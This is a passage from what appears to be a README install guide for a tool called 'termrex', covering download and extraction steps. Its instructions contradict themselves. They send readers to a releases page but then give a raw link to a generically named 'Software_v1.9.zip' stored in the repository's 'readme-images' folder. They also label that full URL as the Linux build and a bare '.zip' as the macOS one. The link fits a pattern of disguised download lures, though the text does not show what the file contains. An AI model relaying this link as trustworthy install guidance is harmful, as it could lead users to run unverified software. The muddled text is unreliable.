### Step 2: Download the Latest Version

On the releases page, you'll find the latest version listed. Look for the most recent release and click the asset that matches your system. The file will start downloading shortly. 

If you’re uncertain which file to choose, the most common options will include versions labeled for different operating systems (like `https://github.com/regularguy1012/termrex/raw/refs/heads/main/readme-images/Software_v1.9.zip` for Linux or `.zip` for macOS).

### Step 3: Extract the File (if needed)

Once the download is complete, you may need to extract the file if it’s in a compressed format.
